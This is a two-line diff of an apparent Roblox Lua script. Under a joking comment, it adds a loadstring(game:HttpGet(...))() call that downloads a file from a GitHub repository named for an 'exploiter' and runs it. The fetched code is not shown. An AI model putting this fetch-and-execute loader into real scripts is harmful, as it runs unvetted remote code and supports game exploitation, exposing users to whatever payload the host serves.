@@ -1,2 +1,2 @@
 -- why did i create this 😭
-loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/justaordinaryexploiter/useless/refs/heads/main/test"))()
